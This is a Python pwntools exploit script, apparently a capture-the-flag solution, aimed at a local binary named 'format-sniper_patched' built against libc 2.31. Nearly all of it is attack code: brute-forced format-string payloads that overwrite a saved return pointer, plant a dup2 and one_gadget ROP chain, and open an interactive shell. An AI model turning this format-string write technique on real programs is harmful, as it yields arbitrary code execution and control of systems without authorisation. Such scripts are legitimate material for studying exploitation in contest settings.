from pwn import *

e = ELF("./format-sniper_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

script = '''
set follow-fork-mode child
breakrva 0x12DA
breakrva 0x12EB
'''

#p = gdb.debug("./format-sniper_patched", gdbscript = script)
# 0xfef8
'''
payload = b"%13053c" + b"%13054c" * 4 + b"%*d" + b"%c" * 3 + b"%hn"
'''
#for i in range(1):
while(True):
    
    p = process("./format-sniper_patched")
    #p = gdb.debug("./format-sniper_patched", gdbscript = script)
    
    
    # gia su la 0x58
    # make ptr point to saved rip of printf
    payload = b"%13053c" + b"%13054c" * 4 + b"%*d" + b"%c" * 3 + b"%hn" + f"%{0xc2 - 0x58}c".encode() + b"%39$hhn"
    p.sendlineafter(b"passing by\n", payload)
    sleep(1)
    
    
    try: #testing process close or not
        payload = f"%{0xc2}c".encode() + b"%39$hhn"
        p.sendline(payload)
        sleep(1)
        payload = f"%{0xc2}c".encode() + b"%39$hhn"
        p.sendline(payload)
    
        ''' ROP:
        rbp, pop_rdi
        0, pop_rsi
        1, dup2
        one_gadget ???
        '''
        
        
        # make ptr point to saved rip + 0x20
        payload = b"c" * 0xc2 + b"%39$hhn" + f"%{13053 + 0x20 - 0xc2 + 0x20}c".encode() + b"%13054c" * 4 + b"%*d" + b"%c" * 3 + b"%27$hn"
        p.sendline(payload)
        # dup2 ???
        payload = b"c" * 0xc2 + b"%39$hhn" + f"%{0xea97d - 7 - 0xc2}c".encode() + b"%c" * 7 + b"%*llx" + b"%41$lln"
        p.sendline(payload)
        
        
        # make ptr point to saved rip + 0x28
        payload = b"c" * 0xc2 + b"%39$hhn" + f"%{13053 + 0x20 - 0xc2 + 0x28}c".encode() + b"%13054c" * 4 + b"%*d" + b"%c" * 3 + b"%27$hn"
        p.sendline(payload)
        # 0xe6c81 one_gadget ???
        payload = b"c" * 0xc2 + b"%39$hhn" + f"%{0xbfbce - 7 - 0xc2}c".encode() + b"%c" * 7 + b"%*llx" + b"%41$lln"
        p.sendline(payload)
        
        
        gdb.attach(p, gdbscript = script)
        
        # leave; ret -> trigger
        payload = b"%49c" + b"%41c" * 14 + b"%*d" + b"%39$hn"
        p.sendline(payload)

    
        break

    except:
        try:
            p.close()
        except:
            pass

p.interactive()